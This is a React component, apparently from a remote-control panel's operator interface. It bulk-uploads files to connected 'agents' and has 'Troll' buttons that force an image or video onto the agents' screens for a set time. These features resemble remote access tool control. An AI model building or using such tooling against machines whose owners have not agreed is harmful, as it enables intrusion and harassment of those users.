import React, { useEffect, useRef, useState } from 'react';
import { AlertCircle, File as FileIcon, Image, Trash2, Upload, Video } from 'lucide-react';
import { useSocket } from './SocketProvider';
import { Alert, AlertDescription } from './ui/alert';
import { Button } from './ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Progress } from './ui/progress';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';

interface PendingFile {
  id: string;
  file: File;
}

function makeId() {
  try {
    return crypto.randomUUID();
  } catch {
    return Math.random().toString(36).slice(2);
  }
}

function resolveDestinationPath(destinationPath: string, filename: string): string {
  const raw = (destinationPath || '').trim();
  if (!raw) return filename;
  const lower = raw.toLowerCase();
  const filenameLower = filename.toLowerCase();

  if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
    return raw;
  }

  if (raw.endsWith('/') || raw.endsWith('\\')) {
    return `${raw}${filename}`;
  }

  if (/^[a-zA-Z]:$/.test(raw)) {
    return `${raw}\\${filename}`;
  }

  const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
  return `${raw}${separator}${filename}`;
}

function formatFileSize(bytes: number) {
  if (!Number.isFinite(bytes) || bytes <= 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.min(sizes.length - 1, Math.floor(Math.log(bytes) / Math.log(k)));
  return `${(bytes / Math.pow(k, i)).toFixed(i === 0 ? 0 : 2)} ${sizes[i]}`;
}

function getFileIcon(type: string) {
  const t = (type || '').toLowerCase();
  if (t.startsWith('image/')) return <Image className="h-4 w-4" />;
  if (t.startsWith('video/')) return <Video className="h-4 w-4" />;
  return <FileIcon className="h-4 w-4" />;
}

export function BulkUploadManager() {
  const { socket, connected, selectedAgent, setSelectedAgent, agents, uploadFile, trollShowImage, trollShowVideo } = useSocket() as any;
  const [files, setFiles] = useState<PendingFile[]>([]);
  const [isDragging, setIsDragging] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const [uploadingById, setUploadingById] = useState<Record<string, boolean>>({});
  const [progressById, setProgressById] = useState<Record<string, number>>({});
  const fileInputRef = useRef<HTMLInputElement>(null);

  const requestDurationMs = (defaultMs: number) => {
    const s = window.prompt('Enter duration in seconds', String(Math.round(defaultMs / 1000)));
    const v = s ? Number(s) : NaN;
    const sec = Number.isFinite(v) && v > 0 ? v : Math.round(defaultMs / 1000);
    return Math.max(1000, Math.min(600000, sec * 1000));
  };

  const formatError = (err: unknown) => {
    if (err instanceof Error) return err.message;
    return String(err);
  };

  const processFiles = async (fileList: File[]) => {
    setError('');
    setSuccess('');

    const processed: PendingFile[] = [];

    for (const file of fileList) {
      if (file.size > 500 * 1024 * 1024) {
        setError(`File ${file.name} is too large (max 500MB)`);
        continue;
      }

      processed.push({ id: makeId(), file });
    }

    setFiles((prev) => [...prev, ...processed]);
    if (processed.length > 0) {
      setSuccess(`Added ${processed.length} files`);
    }
  };

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const fileList = event.target.files;
    if (fileList) {
      void processFiles(Array.from(fileList));
    }
    event.target.value = '';
  };

  const handleDrop = (event: React.DragEvent) => {
    event.preventDefault();
    setIsDragging(false);
    const fileList = event.dataTransfer.files;
    if (fileList) {
      void processFiles(Array.from(fileList));
    }
  };

  const uploadAndWait = async (pending: PendingFile, destinationPath: string) => {
    if (!socket || !connected) {
      throw new Error('Not connected');
    }
    if (!selectedAgent) {
      throw new Error('No agent selected');
    }

    const expectedDestinationPath = resolveDestinationPath(destinationPath, pending.file.name);

    setUploadingById((prev) => ({ ...prev, [pending.id]: true }));
    setProgressById((prev) => ({ ...prev, [pending.id]: 0 }));

    await new Promise<void>((resolve, reject) => {
      const maxMs = Math.min(20 * 60 * 1000, Math.max(90 * 1000, pending.file.size * 2));
      const timeoutId = window.setTimeout(() => {
        window.removeEventListener('file_upload_progress', onProgress);
        window.removeEventListener('file_upload_complete', onComplete);
        reject(new Error('Upload timed out'));
      }, maxMs);

      const cleanup = () => {
        window.clearTimeout(timeoutId);
        window.removeEventListener('file_upload_progress', onProgress);
        window.removeEventListener('file_upload_complete', onComplete);
      };

      const onProgress = (event: any) => {
        const data = event?.detail;
        if (!data) return;
        if (data.agent_id !== selectedAgent) return;
        if (data.filename !== pending.file.name) return;
        if (typeof data.progress === 'number' && data.progress >= 0) {
          setProgressById((prev) => ({ ...prev, [pending.id]: data.progress }));
        }
      };

      const onComplete = (event: any) => {
        const data = event?.detail;
        if (!data) return;
        if (data.agent_id !== selectedAgent) return;
        if (data.filename !== pending.file.name) return;
        cleanup();
        setProgressById((prev) => ({ ...prev, [pending.id]: 100 }));
        resolve();
      };

      window.addEventListener('file_upload_progress', onProgress);
      window.addEventListener('file_upload_complete', onComplete);
      uploadFile(selectedAgent, pending.file, expectedDestinationPath);
    });
  };

  const uploadSingle = async (pending: PendingFile) => {
    setError('');
    setSuccess('');
    setIsUploading(true);
    try {
      await uploadAndWait(pending, "");
      setFiles((prev) => prev.filter((f) => f.id !== pending.id));
      setSuccess(`File ${pending.file.name} uploaded successfully`);
    } catch (err) {
      setError(`Upload failed: ${formatError(err)}`);
    } finally {
      setUploadingById((prev) => ({ ...prev, [pending.id]: false }));
      setIsUploading(false);
    }
  };

  const uploadAllFiles = async () => {
    if (files.length === 0) {
      setError('No files to upload');
      return;
    }
    if (!selectedAgent) {
      setError('No agent selected');
      return;
    }

    setIsUploading(true);
    setError('');
    setSuccess('');

    let successCount = 0;
    let errorCount = 0;

    for (const pending of [...files]) {
      try {
        await uploadAndWait(pending, "");
        setFiles((prev) => prev.filter((f) => f.id !== pending.id));
        successCount++;
      } catch (err) {
        errorCount++;
        setError(`Failed to upload ${pending.file.name}: ${formatError(err)}`);
      } finally {
        setUploadingById((prev) => ({ ...prev, [pending.id]: false }));
      }
    }

    setIsUploading(false);
    setSuccess(`Uploaded ${successCount} files, ${errorCount} failed`);
  };

  const removeFile = (fileId: string) => {
    setFiles((prev) => prev.filter((f) => f.id !== fileId));
  };

  // Global progress listeners as fallback to ensure UI updates
  useEffect(() => {
    const onGlobalProgress = (event: any) => {
      const data = event?.detail;
      if (!data) return;
      const fname = String(data.filename || '');
      const idx = files.findIndex((f) => f.file.name === fname);
      if (idx >= 0 && typeof data.progress === 'number') {
        const id = files[idx].id;
        setUploadingById((prev) => ({ ...prev, [id]: true }));
        setProgressById((prev) => ({ ...prev, [id]: Math.max(0, Math.min(100, data.progress)) }));
      }
    };
    const onGlobalComplete = (event: any) => {
      const data = event?.detail;
      if (!data) return;
      const fname = String(data.filename || '');
      const idx = files.findIndex((f) => f.file.name === fname);
      if (idx >= 0) {
        const id = files[idx].id;
        setProgressById((prev) => ({ ...prev, [id]: 100 }));
        setUploadingById((prev) => ({ ...prev, [id]: false }));
      }
    };
    window.addEventListener('file_upload_progress', onGlobalProgress);
    window.addEventListener('file_upload_complete', onGlobalComplete);
    return () => {
      window.removeEventListener('file_upload_progress', onGlobalProgress);
      window.removeEventListener('file_upload_complete', onGlobalComplete);
    };
  }, [files]);

  return (
    <div className="space-y-4 w-full max-w-5xl mx-auto">
      <Card>
        <CardHeader>
          <CardTitle>Bulk File Upload</CardTitle>
          <CardDescription>Upload files to the currently selected agent</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label>Select Agent</Label>
            <div className="flex flex-col sm:flex-row gap-2">
              <Select
                value={selectedAgent ?? 'ALL'}
                onValueChange={(val) => {
                  if (val === 'ALL') {
                    setSelectedAgent(null);
                  } else {
                    setSelectedAgent(val);
                  }
                }}
              >
                <SelectTrigger className="w-full sm:w-72">
                  <SelectValue placeholder="Choose agent" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="ALL">All agents</SelectItem>
                  {Array.isArray(agents) && agents.map((a: any) => (
                    <SelectItem key={a.id} value={a.id}>
                      {a.name || a.id.slice(0, 8)}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                onClick={async () => {
                  if (!connected) return;
                  if (files.length === 0) {
                    setError('No file selected to troll');
                    return;
                  }
                  const f = files[0].file;
                  if (String(f.type || '').toLowerCase().startsWith('video/')) {
                    await trollShowVideo(null, f, { duration_ms: 8000 });
                    setSuccess(`Trolled all agents with video ${f.name}`);
                  } else {
                    const dur = requestDurationMs(5000);
                    await trollShowImage(null, f, { duration_ms: dur, mode: 'cover' });
                    setSuccess(`Trolled all agents with ${f.name}`);
                  }
                }}
              >
                Troll All
              </Button>
              <Button
                disabled={!selectedAgent}
                onClick={async () => {
                  if (!connected || !selectedAgent) return;
                  if (files.length === 0) {
                    setError('No file selected to troll');
                    return;
                  }
                  const f = files[0].file;
                  if (String(f.type || '').toLowerCase().startsWith('video/')) {
                    await trollShowVideo(selectedAgent, f, { duration_ms: 8000 });
                    setSuccess(`Trolled ${selectedAgent} with video ${f.name}`);
                  } else {
                    const dur = requestDurationMs(5000);
                    await trollShowImage(selectedAgent, f, { duration_ms: dur, mode: 'cover' });
                    setSuccess(`Trolled ${selectedAgent} with ${f.name}`);
                  }
                }}
              >
                Troll Selected Agent
              </Button>
            </div>
          </div>
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {success && (
            <Alert>
              <AlertDescription>{success}</AlertDescription>
            </Alert>
          )}

          {/* destination path UI removed */}

          <div
            className={`border-2 border-dashed rounded-lg p-6 sm:p-8 text-center cursor-pointer transition-colors select-none ${
              isDragging ? 'border-primary bg-primary/5' : 'border-border hover:border-primary'
            }`}
            onDragOver={(e) => {
              e.preventDefault();
              setIsDragging(true);
            }}
            onDragLeave={() => setIsDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
            role="button"
            tabIndex={0}
            onKeyDown={(e) => {
              if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                fileInputRef.current?.click();
              }
            }}
          >
            <Upload className="mx-auto h-8 w-8 mb-2 text-muted-foreground" />
            <p className="text-sm text-muted-foreground mb-1">Drag and drop files here, or click to select</p>
            <p className="text-xs text-muted-foreground">Max size: 500MB per file</p>
            <Input
              ref={fileInputRef}
              type="file"
              multiple
              accept="*/*"
              onChange={handleFileSelect}
              className="hidden"
            />
          </div>

          {files.length > 0 && (
            <div className="space-y-2">
              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-2">
                <h4 className="font-medium">Selected Files ({files.length})</h4>
              </div>

              <div className="space-y-1 max-h-[40vh] sm:max-h-64 overflow-y-auto">
                {files.map((pending) => (
                  <div key={pending.id} className="flex flex-col sm:flex-row sm:items-center gap-2 p-2 border rounded-md">
                    <div className="shrink-0">{getFileIcon(pending.file.type)}</div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-medium truncate">{pending.file.name}</p>
                        {uploadingById[pending.id] && (
                          <span className="text-xs text-muted-foreground tabular-nums">
                            {Math.min(100, Math.max(0, progressById[pending.id] ?? 0))}%
                          </span>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground">{formatFileSize(pending.file.size)}</p>
                      {uploadingById[pending.id] && (
                        <Progress
                          value={Math.min(100, Math.max(0, progressById[pending.id] ?? 0))}
                          className="h-2 mt-2"
                        />
                      )}
                    </div>
                    <div className="flex gap-1 justify-end sm:justify-start">
                      <Button
                        onClick={() => removeFile(pending.id)}
                        disabled={uploadingById[pending.id]}
                        size="icon"
                        variant="outline"
                        title="Remove file"
                      >
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {!selectedAgent && (
            <Alert>
              <AlertDescription>Please select an agent from the Agents tab to upload files.</AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
